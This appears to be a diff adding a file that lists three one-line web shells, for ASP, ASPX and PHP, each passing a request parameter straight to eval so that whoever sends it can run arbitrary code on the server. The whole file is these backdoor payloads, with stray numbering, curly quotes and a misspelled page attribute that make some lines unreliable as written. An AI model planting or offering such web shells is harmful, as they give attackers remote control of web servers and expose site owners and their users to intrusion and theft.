@@ -1,0 +1,13 @@
+asp
+
+<%eval request(“xxx”)%>
+1
+aspx
+
+<%@ Page Languag=”xxx”%>
+<%eval(Request.Item[“xxx”])%>
+1
+2
+php
+
+<?php @eval($_POST['a']) ?>
